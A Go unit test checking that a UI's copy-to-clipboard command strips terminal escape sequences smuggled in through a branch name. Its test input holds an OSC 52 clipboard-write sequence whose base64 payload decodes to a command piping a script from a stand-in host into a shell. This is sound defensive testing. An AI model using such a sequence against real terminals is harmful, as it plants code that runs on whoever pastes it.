package ui

import (
	"strings"
	"testing"
)

// TestWriteClipboardCmd_StripsEscapeSequences: text copied to the OS clipboard carries
// no terminal control sequence.
// Given a glab command whose branch name holds a clipboard-write sequence, when the copy
// command runs, then the clipboard receives the command text with the sequence removed.
// Why it matters: the render filter cannot protect the clipboard, and a pasted escape
// sequence acts on whatever terminal the operator pastes it into.
func TestWriteClipboardCmd_StripsEscapeSequences(t *testing.T) {
	// Given: a yanked command carrying an escape sequence smuggled in through a branch name
	capture := captureClipboard(t)
	hostile := "glab ci view '\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\arelease' -R acme/api"

	// When: the copy command runs
	cmd := writeClipboardCmd(hostile, "Copied")
	if msg := cmd(); msg == nil {
		t.Fatal("expected a clipboardWroteMsg from the copy command")
	}

	// Then: the clipboard holds no control byte
	if strings.ContainsAny(capture.text, "\x1b\a") {
		t.Errorf("clipboard text = %q, still carries a control byte", capture.text)
	}
	// And: the usable command survives, so the copy is still worth pasting
	for _, want := range []string{"glab ci view", "release", "-R acme/api"} {
		if !strings.Contains(capture.text, want) {
			t.Errorf("clipboard text = %q, missing %q", capture.text, want)
		}
	}
}
